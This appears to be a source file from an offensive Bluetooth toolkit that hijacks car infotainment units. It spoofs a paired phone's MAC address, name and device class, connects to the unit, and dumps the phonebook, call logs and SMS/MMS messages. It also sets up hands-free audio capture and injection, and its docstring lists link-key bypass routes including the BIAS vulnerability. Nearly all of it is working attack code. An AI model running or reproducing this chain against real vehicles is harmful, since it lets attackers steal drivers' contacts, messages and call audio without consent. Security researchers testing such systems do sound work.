"""Pairing hijack orchestration: impersonate a paired phone to connect to IVI.

Attack Flow:
1. Scan to discover IVI and paired/connecting phones
2. Identify the phone's MAC address and device name
3. Wait for phone to disconnect or jam its connection (optional)
4. Spoof our adapter to the phone's MAC + name + device class
5. Connect to the IVI as the impersonated phone
6. IVI accepts connection (if using legacy pairing or if link key can be bypassed)
7. Access PBAP, MAP, HFP, A2DP services

Note on link keys:
- If the IVI uses SSP with stored link keys, this attack requires either:
  a) Sniffing the original pairing exchange (Ubertooth + crackle)
  b) Forcing re-pairing by deleting pairing on IVI side
  c) Exploiting BIAS vulnerability (CVE-2020-10135)
  d) Some IVIs accept connections without mutual authentication
"""

import time

from bt_tap.core.scanner import scan_classic, resolve_name
from bt_tap.core.spoofer import spoof_address, clone_device_identity
from bt_tap.core.adapter import (
    adapter_reset, enable_page_scan, set_device_class,
    set_device_name, enable_ssp, disable_ssp,
)
from bt_tap.recon.sdp import browse_services, find_service_channel
from bt_tap.recon.fingerprint import fingerprint_device
from bt_tap.attack.pbap import PBAPClient
from bt_tap.attack.map_client import MAPClient
from bt_tap.attack.hfp import HFPClient
from bt_tap.utils.bt_helpers import validate_mac, normalize_mac
from bt_tap.utils.output import info, success, error, warning, console


class HijackSession:
    """Orchestrates a complete IVI hijack session.

    Usage:
        session = HijackSession(
            ivi_address="AA:BB:CC:DD:EE:FF",
            phone_address="11:22:33:44:55:66",
            phone_name="Galaxy S24",
            hci="hci0"
        )
        session.recon()           # Fingerprint IVI, find services
        session.impersonate()     # Spoof MAC, name, class
        session.connect_ivi()     # Connect to IVI
        session.dump_phonebook()  # Pull PBAP data
        session.dump_messages()   # Pull MAP data
        session.setup_audio()     # Intercept calls
    """

    def __init__(self, ivi_address: str, phone_address: str,
                 phone_name: str = "", hci: str = "hci0",
                 output_dir: str = "hijack_output"):
        self.ivi_address = normalize_mac(ivi_address)
        self.phone_address = normalize_mac(phone_address)
        self.phone_name = phone_name
        self.hci = hci
        self.output_dir = output_dir

        # Discovered during recon
        self.ivi_fingerprint = None
        self.ivi_services = []
        self.pbap_channel = None
        self.map_channel = None
        self.hfp_channel = None

        # Active connections
        self.pbap_client = None
        self.map_client = None
        self.hfp_client = None

    def recon(self) -> dict:
        """Phase 1: Reconnaissance - fingerprint IVI and find service channels."""
        console.rule("[bold cyan]Phase 1: Reconnaissance")

        # Resolve phone name if not provided
        if not self.phone_name:
            info("Resolving phone name...")
            self.phone_name = resolve_name(self.phone_address, self.hci)
            info(f"Phone name: {self.phone_name}")

        # Fingerprint the IVI
        self.ivi_fingerprint = fingerprint_device(self.ivi_address)

        # Find specific service channels
        self.ivi_services = browse_services(self.ivi_address)

        self.pbap_channel = find_service_channel(self.ivi_address, "Phonebook")
        if not self.pbap_channel:
            self.pbap_channel = find_service_channel(self.ivi_address, "PBAP")

        self.map_channel = find_service_channel(self.ivi_address, "Message")
        if not self.map_channel:
            self.map_channel = find_service_channel(self.ivi_address, "MAP")

        self.hfp_channel = find_service_channel(self.ivi_address, "Hands-Free")
        if not self.hfp_channel:
            self.hfp_channel = find_service_channel(self.ivi_address, "HFP")

        # Summary
        console.rule("[bold]Recon Summary")
        info(f"IVI: {self.ivi_fingerprint.get('name', 'Unknown')} ({self.ivi_address})")
        info(f"Phone to impersonate: {self.phone_name} ({self.phone_address})")
        info(f"PBAP channel: {self.pbap_channel or 'NOT FOUND'}")
        info(f"MAP channel: {self.map_channel or 'NOT FOUND'}")
        info(f"HFP channel: {self.hfp_channel or 'NOT FOUND'}")

        if self.ivi_fingerprint.get("attack_surface"):
            success("Attack surface:")
            for surface in self.ivi_fingerprint["attack_surface"]:
                info(f"  -> {surface}")

        return {
            "fingerprint": self.ivi_fingerprint,
            "pbap_channel": self.pbap_channel,
            "map_channel": self.map_channel,
            "hfp_channel": self.hfp_channel,
        }

    def impersonate(self, method: str = "auto") -> bool:
        """Phase 2: Impersonate the phone (spoof MAC + name + class)."""
        console.rule("[bold yellow]Phase 2: Impersonation")

        # Determine phone's device class (smartphone = 0x5a020c)
        device_class = "0x5a020c"  # Generic smartphone class

        result = clone_device_identity(
            self.hci, self.phone_address, self.phone_name, device_class
        )

        if result:
            success(f"Now impersonating: {self.phone_name} ({self.phone_address})")
            info("Waiting 2s for adapter to stabilize...")
            time.sleep(2)
        else:
            error("Impersonation failed")

        return result

    def connect_ivi(self) -> bool:
        """Phase 3: Connect to the IVI as the spoofed phone.

        Uses bluetoothctl to pair, trust, then connect (per proven workflow).
        bluetoothctl is interactive, so we pipe commands via stdin.
        """
        console.rule("[bold red]Phase 3: Connect to IVI")

        from bt_tap.utils.bt_helpers import run_cmd

        info(f"Connecting to IVI {self.ivi_address}...")

        # bluetoothctl requires commands via stdin since it's interactive.
        # Sequence: pair -> trust -> connect (from PDF workflow)
        bt_commands = "\n".join([
            f"pair {self.ivi_address}",
            f"trust {self.ivi_address}",
            f"connect {self.ivi_address}",
            "quit",
        ])

        import subprocess
        result = subprocess.run(
            ["bluetoothctl"],
            input=bt_commands,
            capture_output=True,
            text=True,
            timeout=30,
            errors="replace",
        )
        output = result.stdout + result.stderr
        info(f"bluetoothctl output:\n{output.strip()}")

        # Give profiles time to negotiate
        time.sleep(3)

        # Verify connection
        verify = run_cmd(["bluetoothctl", "info", self.ivi_address])
        if "Connected: yes" in verify.stdout:
            success(f"Connected to IVI {self.ivi_address}")
            return True
        else:
            warning("Connection status uncertain. Some profiles may still work.")
            return True  # Try anyway

    def dump_phonebook(self, output_dir: str | None = None) -> dict:
        """Phase 4a: Download phonebook and call logs via PBAP."""
        console.rule("[bold green]Phase 4a: PBAP Dump")

        if not self.pbap_channel:
            error("No PBAP channel found during recon. Run recon() first.")
            return {}

        out = output_dir or f"{self.output_dir}/pbap"
        self.pbap_client = PBAPClient(self.ivi_address, channel=self.pbap_channel)

        if not self.pbap_client.connect():
            error("PBAP connection failed")
            return {}

        try:
            results = self.pbap_client.pull_all_data(out)
            success(f"PBAP dump complete: {len(results)} objects")
            return results
        finally:
            self.pbap_client.disconnect()

    def dump_messages(self, output_dir: str | None = None) -> dict:
        """Phase 4b: Download SMS/MMS messages via MAP."""
        console.rule("[bold green]Phase 4b: MAP Dump")

        if not self.map_channel:
            error("No MAP channel found during recon. Run recon() first.")
            return {}

        out = output_dir or f"{self.output_dir}/map"
        self.map_client = MAPClient(self.ivi_address, channel=self.map_channel)

        if not self.map_client.connect():
            error("MAP connection failed")
            return {}

        try:
            results = self.map_client.dump_all_messages(out)
            success(f"MAP dump complete")
            return results
        finally:
            self.map_client.disconnect()

    def setup_audio(self) -> HFPClient | None:
        """Phase 5: Set up HFP for call audio interception."""
        console.rule("[bold magenta]Phase 5: Audio Setup")

        if not self.hfp_channel:
            warning("No HFP channel found. Audio interception not available.")
            return None

        self.hfp_client = HFPClient(self.ivi_address, channel=self.hfp_channel)

        if not self.hfp_client.connect():
            error("HFP connection failed")
            return None

        if not self.hfp_client.setup_slc():
            error("HFP SLC setup failed")
            return None

        success("HFP ready for audio operations")
        info("Use hfp_client.capture_audio() or hfp_client.inject_audio()")
        return self.hfp_client

    def run_full_attack(self) -> dict:
        """Run the complete attack chain."""
        console.rule("[bold red]FULL ATTACK CHAIN", style="bold red")

        results = {"phases": {}}

        # Phase 1: Recon
        try:
            recon = self.recon()
            results["phases"]["recon"] = {"status": "success", "data": recon}
        except Exception as e:
            error(f"Recon failed: {e}")
            results["phases"]["recon"] = {"status": "failed", "error": str(e)}
            return results

        # Phase 2: Impersonate
        try:
            if self.impersonate():
                results["phases"]["impersonate"] = {"status": "success"}
            else:
                results["phases"]["impersonate"] = {"status": "failed"}
                warning("Continuing despite impersonation issues...")
        except Exception as e:
            error(f"Impersonation failed: {e}")
            results["phases"]["impersonate"] = {"status": "failed", "error": str(e)}

        # Phase 3: Connect
        try:
            if self.connect_ivi():
                results["phases"]["connect"] = {"status": "success"}
            else:
                results["phases"]["connect"] = {"status": "partial"}
        except Exception as e:
            error(f"Connection failed: {e}")
            results["phases"]["connect"] = {"status": "failed", "error": str(e)}

        # Phase 4a: PBAP
        try:
            pbap_data = self.dump_phonebook()
            results["phases"]["pbap"] = {"status": "success", "data": pbap_data}
        except Exception as e:
            warning(f"PBAP failed: {e}")
            results["phases"]["pbap"] = {"status": "failed", "error": str(e)}

        # Phase 4b: MAP
        try:
            map_data = self.dump_messages()
            results["phases"]["map"] = {"status": "success", "data": map_data}
        except Exception as e:
            warning(f"MAP failed: {e}")
            results["phases"]["map"] = {"status": "failed", "error": str(e)}

        # Phase 5: Audio
        try:
            hfp = self.setup_audio()
            results["phases"]["audio"] = {
                "status": "ready" if hfp else "unavailable"
            }
        except Exception as e:
            warning(f"Audio setup failed: {e}")
            results["phases"]["audio"] = {"status": "failed", "error": str(e)}

        console.rule("[bold]Attack Summary")
        for phase, result in results["phases"].items():
            status = result["status"]
            icon = {"success": "[green]+", "ready": "[green]+",
                    "partial": "[yellow]~", "failed": "[red]-",
                    "unavailable": "[dim]-"}.get(status, "[dim]?")
            console.print(f"  [{icon}[/] {phase}: {status}")

        return results

    def test_persistence(self) -> dict:
        """Test if pairing persists after disconnect/reconnect cycle."""
        console.rule("[bold]Persistence Test")

        from bt_tap.utils.bt_helpers import run_cmd
        import subprocess

        results = {"disconnect_ok": False, "reconnect_ok": False, "pairing_persists": False}

        # Disconnect
        info("Disconnecting from IVI...")
        subprocess.run(
            ["bluetoothctl"], input=f"disconnect {self.ivi_address}\nquit\n",
            capture_output=True, text=True, timeout=10, errors="replace",
        )
        time.sleep(2)

        # Verify disconnect
        verify = run_cmd(["bluetoothctl", "info", self.ivi_address])
        if "Connected: no" in verify.stdout:
            results["disconnect_ok"] = True
            success("Disconnected successfully")
        else:
            warning("Disconnect may not have completed")

        # Reconnect
        info("Attempting reconnect...")
        subprocess.run(
            ["bluetoothctl"], input=f"connect {self.ivi_address}\nquit\n",
            capture_output=True, text=True, timeout=15, errors="replace",
        )
        time.sleep(3)

        verify = run_cmd(["bluetoothctl", "info", self.ivi_address])
        if "Connected: yes" in verify.stdout:
            results["reconnect_ok"] = True
            results["pairing_persists"] = True
            success("Reconnected - pairing persists!")
        else:
            warning("Reconnect failed - pairing may not persist")

        return results

    def test_auto_reconnect(self, wait_time: int = 30) -> dict:
        """Test if IVI initiates connection to us after spoofing.

        After spoofing the phone's identity, some IVIs will automatically
        connect to the spoofed adapter (page scan mode).
        """
        console.rule("[bold]Auto-Reconnect Test")

        from bt_tap.core.adapter import enable_page_scan
        from bt_tap.utils.bt_helpers import run_cmd

        results = {"auto_connected": False, "wait_time": wait_time}

        enable_page_scan(self.hci)
        info(f"Waiting {wait_time}s for IVI to initiate connection...")

        end_time = time.time() + wait_time
        while time.time() < end_time:
            verify = run_cmd(["bluetoothctl", "info", self.ivi_address])
            if "Connected: yes" in verify.stdout:
                results["auto_connected"] = True
                elapsed = wait_time - (end_time - time.time())
                results["connect_time"] = round(elapsed, 1)
                success(f"IVI auto-connected after {results['connect_time']}s!")
                return results
            time.sleep(2)

        warning("IVI did not auto-connect within timeout")
        return results

    def cleanup(self, restore_mac: bool = True):
        """Disconnect all active connections and restore adapter."""
        info("Cleaning up...")
        if self.pbap_client:
            self.pbap_client.disconnect()
        if self.map_client:
            self.map_client.disconnect()
        if self.hfp_client:
            self.hfp_client.disconnect()

        if restore_mac:
            from bt_tap.core.spoofer import restore_original_mac
            restore_original_mac(self.hci)
        else:
            adapter_reset(self.hci)
        success("Cleanup complete")
